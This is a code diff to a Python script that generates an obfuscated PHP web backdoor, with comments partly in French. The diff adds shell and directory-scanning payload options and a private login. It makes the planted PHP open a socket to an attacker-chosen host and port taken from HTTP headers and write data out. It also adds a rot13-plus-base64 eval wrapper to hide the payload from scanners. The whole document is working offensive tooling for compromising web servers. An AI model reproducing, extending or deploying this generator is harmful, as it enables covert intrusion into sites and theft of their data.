@@ -2,6 +2,11 @@ import argparse
 import base64
 import sys
 
+
+
+
+supported_stuff=['shell_system','shell_nosystem','scandir']
+
 parser = argparse.ArgumentParser()
 #Options de generation de la backdoor
 #parser.add_argument("--generate", "-g", action="store_true", dest='generate', help="say a ! ")
@@ -9,9 +14,9 @@ parser = argparse.ArgumentParser()
 parser.add_argument("--plain", "-p", action="store_true", dest="plain", help="Write the backdoor's code in your terminal")
 parser.add_argument("--file", "-f", action="store", dest="file", help="Write the backdoor's code in the FILE file")
 #Encode
-parser.add_argument("--encode","-e", action="store", dest="encode", choices=['base64', 'none', '#'])
+parser.add_argument("--encode","-e", action="store", dest="encode", choices=['none','base64', 'rot13'])
 #Options to be included
-parser.add_argument("--stuff",action="store",dest="stuff",help="Stuff to be included in the backdoor separed by comma\r\nPossibles values:shell_system,shell_nosystem")
+parser.add_argument("--stuff",action="store",dest="stuff",help="Stuff to be included in the backdoor separed by comma\r\nPossibles values:"+str(supported_stuff))
 #Identifiants
 parser.add_argument("--login","-l",action="store",dest="login",help="Your Private backdoor login")
 parser.add_argument("--password",action="store",dest="password",help="Your Private backdoor password")
@@ -32,9 +37,6 @@ def generate_backdoor(option):
 backdoor=""
 
 
-
-supported_stuff=['shell_system','shell_nosystem','scandir']
-
 if(args.stuff):
 	options=args.stuff.split(',')
 	for option in options:
@@ -47,8 +49,7 @@ if(args.stuff):
 
 
 
-
-backdoor+="$fp = fsockopen('localhost', 1223, $errno, $errstr, 30);"
+backdoor+="$fp = fsockopen($_SERVER['HTTP_IP'], $_SERVER['HTTP_PORT'], $errno, $errstr, 30);"
 backdoor+="fwrite($fp, $msg);"
 backdoor+="fclose($fp);"
 #backdoor+='echo "DEBUG";foreach (getallheaders() as $name => $value) {echo "$name: $value\n";} echo ($_SERVER["HTTP_CMD"]);'
@@ -59,7 +60,13 @@ if(args.encode):
 	if(args.encode=="base64"):
 		backdoor=base64.b64encode(backdoor)
 		backdoor="eval(base64_decode('"+backdoor
-		backdoor+="'))"
+		backdoor+="'));"
+	if(args.encode=="rot13"):
+		backdoor=base64.b64encode(backdoor)
+		backdoor=backdoor.encode('rot13')
+		backdoor="eval(base64_decode(str_rot13('"+backdoor
+		backdoor+="')));"
+
 #Finaly End the backdoor generation
 if(args.tags):
 	backdoor='<script language="php"> '+backdoor
